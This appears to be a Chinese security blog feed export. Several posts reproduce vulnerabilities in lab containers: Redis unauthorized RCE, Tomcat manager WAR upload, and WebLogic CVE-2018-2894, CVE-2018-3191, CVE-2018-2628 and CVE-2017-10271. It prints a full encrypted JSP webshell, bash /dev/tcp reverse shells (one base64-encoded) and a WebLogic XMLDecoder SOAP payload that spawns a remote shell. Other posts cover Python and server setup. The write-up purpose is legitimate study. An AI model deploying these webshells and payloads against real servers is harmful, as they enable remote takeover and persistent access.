        <content type="html"><![CDATA[<h1 id="Redis-4-x-5-x-未授权访问漏洞"><a href="#Redis-4-x-5-x-未授权访问漏洞" class="headerlink" title="Redis 4.x/5.x 未授权访问漏洞"></a>Redis 4.x/5.x 未授权访问漏洞</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动redis 4.0.14：</p><pre><code>docker-compose up -d</code></pre><p>环境启动后，通过<code>redis-cli -h your-ip</code>即可进行连接，可见存在未授权访问漏洞。</p><p><img src="https://s1.ax1x.com/2020/08/15/dFLTUI.png" alt="dFLTUI.png"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用如下POC即可直接执行命令<a href="https://github.com/vulhub/redis-rogue-getshell：" target="_blank" rel="noopener">https://github.com/vulhub/redis-rogue-getshell：</a></p><pre><code>cd RedisModulesSDK/make</code></pre><p><img src="https://s1.ax1x.com/2020/08/15/dFLq8f.png" alt="dFLq8f.png"></p><pre><code>python3 redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp.so -c &quot;id&quot;</code></pre><p><img src="https://s1.ax1x.com/2020/08/15/dFOiGV.png" alt="dFOiGV.png"></p><p><img src="https://s1.ax1x.com/2020/08/15/dFOZqJ.png" alt="dFOZqJ.png"></p><p><img src="https://s1.ax1x.com/2020/08/15/dFO1xO.png" alt="dFO1xO.png"></p><p>完。</p><p>参考资料：<a href="https://github.com/vulhub/redis-rogue-getshell" target="_blank" rel="noopener">https://github.com/vulhub/redis-rogue-getshell</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic 任意文件上传漏洞（CVE-2018-2894）</title>
      <link href="/2020/08/08/Weblogic-CVE-2018-2894/"/>
      <url>/2020/08/08/Weblogic-CVE-2018-2894/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894）</h1><p>Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。</p><p>利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令，启动weblogic 12.2.1.3：</p><p>环境启动后，访问<code>http://your-ip:7001/console</code>，即可看到后台登录页面。</p><p>执行<code>docker-compose logs | grep password</code>可查看管理员密码，管理员用户名为<code>weblogic</code>。</p><p><strong>我在虚拟机执行查看密码命令报错，于是在docker配置文件中发现了密码，/var/lib/docker/containers/dockerID/dockerID-json.log文件中搜索password字段</strong></p><p>登录后台页面，点击<code>base_domain</code>的配置，在“高级”中开启“启用 Web 服务测试页”选项：</p><p><img src="https://s1.ax1x.com/2020/08/09/aoZOAg.png" alt="aoZOAg.png"></p><p>开启功能后点击<code>保存</code></p><p><img src="https://s1.ax1x.com/2020/08/09/aoZXNQ.png" alt="aoZXNQ.png"></p><p>第一次保存后会提示重启服务，重启服务即可。</p><p><img src="https://s1.ax1x.com/2020/08/09/aoZx9s.png" alt="aoZx9s.png"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:7001/ws_utc/config.do</code>，设置Work Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。我将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p><p><img src="https://s1.ax1x.com/2020/08/09/aoZz3n.png" alt="aoZz3n.png"></p><p>之后点击<code>安全</code>，上传木马文件。</p><p><img src="https://s1.ax1x.com/2020/08/09/aoeiHU.png" alt="aoeiHU.png"></p><p>获取时间戳，然后访问<code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>，即可执行webshell：</p><p><img src="https://s1.ax1x.com/2020/08/09/aoeAN4.png" alt="aoeAN4.png"></p><p>使用工具连接。成功获取webshell。</p><p><img src="https://s1.ax1x.com/2020/08/09/aoeE4J.png" alt="aoeE4J.png"></p><p>完</p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</title>
      <link href="/2020/08/08/Tomcat7/"/>
      <url>/2020/08/08/Tomcat7/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat7-弱口令-amp-amp-后台getshell漏洞"><a href="#Tomcat7-弱口令-amp-amp-后台getshell漏洞" class="headerlink" title="Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞"></a>Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</h1><p>tomcat6版本以后针对爆破做了锁定机制的设置。tomcat7版本以上无法爆破。</p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>在tomcat6及6之前，是可以直接暴力破解的。在tomcat6以后，默认是做了暴力破解的限制的。默认尝试5次失败后，账号被锁定。该参数在配置文件server.xml中默认无配置，在无配置的情况下，默认是5次错误机会。</p><p>因此在编写弱口令扫描插件时，要注意如果尝试次数过多，即使字典中有正确密码，会提示401错误，而且和密码错误的返回结果相同，很容易误认为是脚本的问题。这点要注意。解决办法就是在测试时，将server.xml中添加 failureCount=”999999” lockOutTime=”0”。</p><p>所以暴力破解前需注意两个问题。</p><p>第一个是版本问题。</p><p>第二个要注意的是，密码正确时，不一定返回200，返回403也是密码正确的情况。</p><h2 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h2><p>首先启动tomcat环境，<code>docker-compose up -d</code></p><p>打开tomcat管理页面<code>http://your-ip:8080/manager/html</code>，输入弱密码<code>tomcat:tomcat</code>，即可访问后台：</p><p><img src="https://s1.ax1x.com/2020/08/09/aoZg0O.png" alt="aoZg0O.png"></p><p>找到上传文件</p><p><img src="https://s1.ax1x.com/2020/08/09/aoZWAe.png" alt="aoZWAe.png"></p><p>准备包含木马的war包，我这里使用的是<code>nicai.jsp</code>,压缩成zip文件，修改zip后缀名为war即可成为一个war包。</p><p><code>nicai.jsp</code>源码，密码为<code>nicai</code></p><pre><code class="jsp">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if(request.getParameter(&quot;nicai&quot;)!=null){String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;}Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;</code></pre><p><img src="https://s1.ax1x.com/2020/08/09/aoZhhd.png" alt="aoZhhd.png"></p><p>如上图所示，木马已成功上传。通过木马连接工具连接获取webshell。</p><p><img src="https://s1.ax1x.com/2020/08/09/aoZI1I.png" alt="aoZI1I.png"></p><p>完</p><p>参考资料:<a href="https://blog.csdn.net/hsj_csdn/article/details/100165231" target="_blank" rel="noopener">https://blog.csdn.net/hsj_csdn/article/details/100165231</a></p><p>​               <a href="https://blog.csdn.net/qq_42357070/article/details/83857870" target="_blank" rel="noopener">https://blog.csdn.net/qq_42357070/article/details/83857870</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic CVE-2018-3191远程代码命令执行漏洞复现</title>
      <link href="/2020/08/08/Weblogic-CVE-2018-3191/"/>
      <url>/2020/08/08/Weblogic-CVE-2018-3191/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic-CVE-2018-3191远程代码命令执行漏洞复现"><a href="#Weblogic-CVE-2018-3191远程代码命令执行漏洞复现" class="headerlink" title="Weblogic CVE-2018-3191远程代码命令执行漏洞复现"></a>Weblogic CVE-2018-3191远程代码命令执行漏洞复现</h1><p>北京时间10月17日，Oracle官方发布的10月关键补充更新CPU（重要补丁更新）中修复了一个高危的WebLogic远程代码执行漏洞（CVE-2018-3191）。该漏洞允许未经身份验证的攻击者通过T3协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。</p><p>攻击机：192.168.200.130</p><p>靶机：192.168.200.131</p><p>环境：使用的cve-2018-2628的docker环境</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问靶机</p><p><img src="https://s1.ax1x.com/2020/08/08/aoETPA.png" alt="aoETPA.png"></p><p>访问登录页面</p><p><img src="https://s1.ax1x.com/2020/08/08/aoZMkQ.png" alt="aoZMkQ.png"></p><p>首先下载ysoserial，并启动一个JRMP Server：</p><blockquote><p>bash -i &gt;&amp; /dev/tcp/192.168.200.130/5555 0&gt;&amp;1<br>把bash转换为base64避免被转义。<br>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMC4xMzAvNTU1NSAwPiYx}|{base64,-d}|{bash,-i}’</p></blockquote><p><code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar  ysoserial.exploit.JRMPListener 7777 CommonsCollections1 &#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMC4xMzAvNTU1NSAwPiYx}|{base64,-d}|{bash,-i}&#39;</code></p><p><img src="https://s1.ax1x.com/2020/08/08/aoZQYj.png" alt="aoZQYj.png"></p><p>在攻击机再启动一个监听。监听本地端口5555</p><p><code>nc -lvvp 5555</code></p><p><strong>写一下遇到的坑，网上的weblogic-spring-jndi-10.3.6.0.jar文件已经损坏，下载下来只有1kb</strong></p><p><strong>nc命令反弹失败，bash命令也需要经过转换才能反弹成功</strong></p><blockquote><p>在本地的攻击者主机上运行此脚本：</p><p>weblogic-spring-jndi-12.2.1.3.jar 对于weblogic：12.2.1.3</p><p>weblogic-spring-jndi-10.3.6.0.jar 对于weblogic：10.3.6.0、12.2.1.0、12.1.3.0、12.2.1.1</p></blockquote><p>python exploit.py 192.168.200.131 7002 weblogic-spring-jndi-10.3.6.0.jar 192.168.200.130 7777</p><p><img src="https://s1.ax1x.com/2020/08/09/aoZ0h9.png" alt="aoZ0h9.png"></p><p>成功得到反弹的shell。</p><p><img src="https://s1.ax1x.com/2020/08/09/aoZDpR.png" alt="aoZDpR.png"></p><p>完。</p><p>参考资料：<a href="https://www.cnblogs.com/backlion/p/9851625.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9851625.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</title>
      <link href="/2020/08/08/Weblogic-CVE-2018-2628/"/>
      <url>/2020/08/08/Weblogic-CVE-2018-2628/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2018-2628漏洞复现"><a href="#CVE-2018-2628漏洞复现" class="headerlink" title="CVE-2018-2628漏洞复现"></a>CVE-2018-2628漏洞复现</h1><h2 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h2><p>Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><code>docker start a2</code>启动环境</p><p>172.19.0.2:7001 为docker地址</p><p>192.168.200.131:7002 为虚拟机地址</p><p>192.168.200.1为攻击地址</p><p>访问目标地址:<a href="http://192.168.200.131:7002/,出现一下页面说明可能存在漏洞，需要进一步验证。" target="_blank" rel="noopener">http://192.168.200.131:7002/,出现一下页面说明可能存在漏洞，需要进一步验证。</a></p><p><img src="https://s1.ax1x.com/2020/08/08/aoETPA.png" alt="aoETPA.png"></p><p>由于我这边是搭建的漏洞环境，直接开始漏洞复现</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先下载ysoserial，并启动一个JRMP Server：</p><p><code>D:\dc-exp\Weblogic\CVE-2018-2628&gt;java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#39;touch /tmp/success&#39;</code></p><p><img src="https://s1.ax1x.com/2020/08/08/aoE78I.png" alt="aoE78I.png"></p><p>运行exploit.py脚本，我这里是44553.py文件。</p><p><code>D:\dc-exp\Weblogic\CVE-2018-2628&gt;python 44553.py 172.19.0.2 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.200.1 1099 JRMPclient</code></p><p><img src="https://s1.ax1x.com/2020/08/08/aoEH2t.png" alt="aoEH2t.png"></p><p>在复现过程中，一直无法成功执行命令。最后发现他是直接将命令直接发送到docker靶机的IP和端口。而我是把数据包一直发送到虚拟机地址，所以只发送了数据包连接就被关闭了。</p><h3 id="查看文件是否创建成功"><a href="#查看文件是否创建成功" class="headerlink" title="查看文件是否创建成功"></a>查看文件是否创建成功</h3><p><img src="https://s1.ax1x.com/2020/08/08/aoEbxP.png" alt="aoEbxP.png"></p><p>完。</p><p>参考资料:<a href="https://blog.csdn.net/archersaber39/article/details/80135463" target="_blank" rel="noopener">https://blog.csdn.net/archersaber39/article/details/80135463</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 2安装requests模块报错</title>
      <link href="/2020/07/31/python2-error/"/>
      <url>/2020/07/31/python2-error/</url>
      
        <content type="html"><![CDATA[<p>电脑里有python2和python3两个环境。配置起来容易出问题。</p><h2 id="安装模块遇到的坑"><a href="#安装模块遇到的坑" class="headerlink" title="安装模块遇到的坑"></a>安装模块遇到的坑</h2><p>pip install xxxxxx默认使用的是我python2的pip</p><p>那么如何安装python3的pip呢？</p><p>通过python3 -m pip install cryptography可以正常安装python3模块。</p><p>通过python2 -m pip install cryptography可以正常安装python2模块。</p><h3 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h3><p><img src="https://s1.ax1x.com/2020/07/31/aQki3F.png" alt="aQki3F.png"></p><h3 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h3><p>因为用户目录包含中文导致，用户名是中文导致的。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>在安装目录 Python27\Lib\目录,找到mimetypes.py文件。</p><p>在import下添加几行代码。</p><pre><code>if sys.getdefaultencoding() != &#39;gbk&#39;:  reload(sys)  sys.setdefaultencoding(&#39;gbk&#39;)</code></pre><p>完成后保存，在cmd中执行pip install requests</p><p><img src="https://s1.ax1x.com/2020/07/31/aQknN6.png" alt="aQknN6.png"></p><p>参考资料:<a href="https://blog.csdn.net/qq_32448559/article/details/81279267" target="_blank" rel="noopener">https://blog.csdn.net/qq_32448559/article/details/81279267</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic &lt; 10.3.6 反序列化漏洞（CVE-2017-10271）</title>
      <link href="/2020/07/31/Weblogic-CVE-2017-10271/"/>
      <url>/2020/07/31/Weblogic-CVE-2017-10271/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><a href="#Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）"></a>Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>WebLogic WLS组件中存在CVE-2017-10271远程代码执行漏洞，可以构造请求对运行WebLogic中间件的主机进行攻击，近期发现此漏洞的利用方式为传播挖矿程序。</p><p>不同版本WebLogic主机均被植入了相同的恶意程序，该程序会消耗大量的主机CPU资源。经分析，攻击者针对WebLogic WLS组件中存在的CVE-2017-10271远程代码执行漏洞，构造请求对运行的WebLogic中间件主机进行攻击，由于该漏洞利用方式简单，且能够直接获取目标服务器的控制权限，影响范围较广，近期发现此漏洞的利用方式为传播虚拟币挖矿程序，不排除会被黑客用于其他目的的攻击。</p><h3 id="受影响系统："><a href="#受影响系统：" class="headerlink" title="受影响系统："></a>受影响系统：</h3><blockquote><p>Oracle WebLogic Server 12.2.1.2.0<br>Oracle WebLogic Server 12.2.1.1<br>Oracle WebLogic Server 12.1.3.0<br>Oracle WebLogic Server 10.3.6.0</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用docker环境，</p><p><code>docker ps -a</code></p><p>启用环境,</p><p><code>docker start 容器ID</code></p><p>容器地址为<code>172.20.0.2:7001</code>映射到宿主机7004端口访问<code>192.168.200.131:7004</code></p><p>原始界面为</p><p><img src="https://s1.ax1x.com/2020/07/31/aQiMa6.png" alt="aQiMa6.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>判断是否可能存在漏洞。访问<code>http://192.168.200.131:7004/wls-wsat/CoordinatorPortType11</code>，出现此页面说明可能存在漏洞。</li></ol><p><img src="https://s1.ax1x.com/2020/07/31/aQiGxH.png" alt="aQiGxH.png"></p><ol start="2"><li>构造POST包进行测试，写入test.txt。</li></ol><blockquote><p>wls-wsat路径  /root/Oracle/Middleware//user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat/</p></blockquote><pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.200.131:7004User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Upgrade-Insecure-Requests: 1Content-Type: text/xmlContent-Length: 756&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;      &lt;soapenv:Header&gt;        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;         &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;                         &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;                        &lt;string&gt;xmldecoder_vul_test&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;                    &lt;/object&gt;            &lt;/java&gt;        &lt;/work:WorkContext&gt;      &lt;/soapenv:Header&gt;      &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</code></pre><p><img src="https://s1.ax1x.com/2020/07/31/aQi7QJ.png" alt="aQi7QJ.png"></p><ol start="3"><li><p>访问写入的test.txt文件,漏洞验证成功.</p><p><img src="https://s1.ax1x.com/2020/07/31/aQFpSe.png" alt="aQFpSe.png"></p></li><li><p>使用反弹shell的语句，在攻击主机打开监听：<code>nc -l -p 21</code>。发送如下数据包</p><pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/21 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</code></pre></li><li><p>监听端收到数据，成功获取shell</p><p><img src="https://s1.ax1x.com/2020/07/31/alsQOK.png" alt="alsQOK.png"></p></li></ol><h2 id="漏洞验证脚本"><a href="#漏洞验证脚本" class="headerlink" title="漏洞验证脚本"></a>漏洞验证脚本</h2><p>使用<code>python2</code>运行脚本</p><p><img src="https://s1.ax1x.com/2020/07/31/aQFFeI.png" alt="aQFFeI.png"></p><p>脚本源代码</p><pre><code class="python2">#!/usr/bin/env python# coding:utf-8import requestsfrom sys import argvheaders = {    &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0&#39;,    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,    &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,    &#39;Content-Type&#39;: &#39;text/xml&#39;    }def Webogic_XMLDecoder_poc(url):    #url=&quot;http://192.168.8.148:7001&quot;    posturl=url+&#39;/wls-wsat/CoordinatorPortType&#39;    data = &#39;&#39;&#39;    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;        &lt;soapenv:Header&gt;            &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;                &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;                        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;                        &lt;string&gt;xmldecoder_vul_test&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;                    &lt;/object&gt;                &lt;/java&gt;            &lt;/work:WorkContext&gt;        &lt;/soapenv:Header&gt;        &lt;soapenv:Body/&gt;    &lt;/soapenv:Envelope&gt;    &#39;&#39;&#39;    print url    try:        r=requests.post(posturl,data=data,headers=headers,timeout=5)        geturl=url+&quot;/wls-wsat/test.txt&quot;        #print geturl        check_result = requests.get(geturl,headers=headers,timeout=5)        if &#39;xmldecoder_vul_test&#39; in check_result.text:            print u&quot;存在WebLogic WLS远程执行漏洞(CVE-2017-10271)&quot;    except:        passif __name__ == &#39;__main__&#39;:    if len(argv) == 1:        print &quot;Please input python Webogic_XMLDecoder_poc.py http://xxxx:7001&quot;        exit(0)    else:        url = argv[1]    Webogic_XMLDecoder_poc(url)</code></pre><p>参考资料:<a href="https://www.cnblogs.com/xiaozi/p/8205107.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/8205107.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建云笔记和云网盘</title>
      <link href="/2020/07/19/cloud-server/"/>
      <url>/2020/07/19/cloud-server/</url>
      
        <content type="html"><![CDATA[<h2 id="服务器配置记录"><a href="#服务器配置记录" class="headerlink" title="服务器配置记录"></a>服务器配置记录</h2><h2 id="宝塔安装命令"><a href="#宝塔安装命令" class="headerlink" title="宝塔安装命令"></a>宝塔安装命令</h2><h3 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h3><p>yum install -y wget &amp;&amp; wget -O install.sh <a href="http://download.bt.cn/install/install_6.0.sh" target="_blank" rel="noopener">http://download.bt.cn/install/install_6.0.sh</a> &amp;&amp; sh install.sh</p><h3 id="Ubuntu-Debian"><a href="#Ubuntu-Debian" class="headerlink" title="Ubuntu/Debian"></a>Ubuntu/Debian</h3><p>wget -O install.sh <a href="http://download.bt.cn/install/install-ubuntu_6.0.sh" target="_blank" rel="noopener">http://download.bt.cn/install/install-ubuntu_6.0.sh</a> &amp;&amp; sudo bash install.sh</p><p>安装宝塔后，一键部署web环境，导入网站源码，设置默认站点即可正常访问。</p><p>如果访问失败，查看防火墙是否放行端口。</p><h2 id="KIFT私人网盘"><a href="#KIFT私人网盘" class="headerlink" title="KIFT私人网盘"></a>KIFT私人网盘</h2><p>kiftd：<a href="https://kohgylw.gitee.io/#myCarousel" target="_blank" rel="noopener">https://kohgylw.gitee.io/#myCarousel</a></p><p>前期准备工作</p><h3 id="配置java环境"><a href="#配置java环境" class="headerlink" title="配置java环境"></a>配置java环境</h3><p>使用解压即用版 Java（.tar.gz）的 Linux 用户 而言，您需要先将解压后的 Java 主目录中的 bin 文件夹添加到您的环境变量 PATH 中。<br>在 Linux 系统中，一个较为常见的做法是通过配置 /etc/profile 文件来添加环境变量:</p><pre><code>apt install default-jreapt install openjdk-11-jre-headlessapt install openjdk-8-jre-headlesswhich javals -lrt找到java路径/usr/lib/jvm/java-11-oracle/jre/bin/</code></pre><ol><li>在“终端”中使用文本编辑器（例如 nano）打开/etc/profile 文件：<br>sudo nano /etc/profile</li><li>在该文件下方的空白处加入以下内容：<br>export PATH=/{您 JAVA 的解压路径} /bin:$PATH</li><li>保存修改并关闭该文件。</li><li>执行以下命令使得该环境变量配置文件立即生效：<br>source /etc/profile</li></ol><p>完成上述步骤后，您便能够在任意路径下使用 java 命令了。当然，您可以通过以下方式测试它是否已经可用：<br>java -version<br>如果在该命令执行后能正确显示 Java 的版本信息，则说明配置成功。否则请重新检查 PATH 配置。</p><h3 id="下载KITD软件包"><a href="#下载KITD软件包" class="headerlink" title="下载KITD软件包"></a>下载KITD软件包</h3><p>使用命令启动 kiftd<br>1，使用 cd 命令进入 kiftd 应用主目录。<br>2，以命令模式启动 kiftd：<br>java -jar kiftd-x.x.x-xxx.jar -console</p><p>这样运行关闭终端，服务会被关闭。</p><h3 id="后台运行"><a href="#后台运行" class="headerlink" title="后台运行"></a>后台运行</h3><p>nohup java -jar kiftd-x.x.x-xxx.jar -start &amp; echo $!<br>该操作将令 kiftd 以后台模式运行，直接启动服务器且不受终端关闭的影响，<br>持续提供访问服务。Kiftd 的所有输出信息将保存在同级目录下的 nohup.out 文<br>件中，同时该命令还会在下方打印其进程的 PID 号。<br>当您需要结束 kiftd 运行时，可以使用如下命令将其关闭：<br>kill {PID}</p><h3 id="修改端口"><a href="#修改端口" class="headerlink" title="修改端口"></a>修改端口</h3><p>自带的8080端口有冲突，Kiftd 的配置文件是 kiftd 存储设置信息的基础。该文件位于 kiftd 主目录下的 conf 文件夹中，名为 server.properties 。您可以使用任意文本编辑器打开并编辑它。</p><p>修改端口后重新启动进程，开启服务。</p><hr><h2 id="wiznote笔记"><a href="#wiznote笔记" class="headerlink" title="wiznote笔记"></a>wiznote笔记</h2><h3 id="ubuntu下载docker"><a href="#ubuntu下载docker" class="headerlink" title="ubuntu下载docker"></a>ubuntu下载docker</h3><p>curl -fsSL <a href="https://get.docker.com" target="_blank" rel="noopener">https://get.docker.com</a> | bash -s docker –mirror Aliyun</p><p>将用户添加到docker组<br>sudo usermod -aG docker admin</p><p>创建文件夹<br>cd ~<br>mkdir wizdata</p><h3 id="docker下载wiznote镜像"><a href="#docker下载wiznote镜像" class="headerlink" title="docker下载wiznote镜像"></a>docker下载wiznote镜像</h3><pre><code>docker search wiznote#搜索wiznote镜像docker pull wiznote/wizserver-amd64#下载镜像docker run --name wiz --restart=always -it -d -v  ~/wizdata:/wiz/storage -v  /etc/localtime:/etc/localtime -p 81:80 -p 9269:9269/udp wiznote/wizserver-amd64#81端口是外网访问端口</code></pre><p>通过 8080:80 告诉 Docker 8080 端口是对外开放的端口，80 端口对外开放的端口映射到容器里的端口号。</p><p>修改启动参数，并重新启动服务，例如修改映射端口<br>docker stop wiz<br>docker rm wiz<br>docker run –name wiz –restart=always -it -d -v  ~/wizdata:/wiz/storage -v  /etc/localtime:/etc/localtime -p 80:80 -p 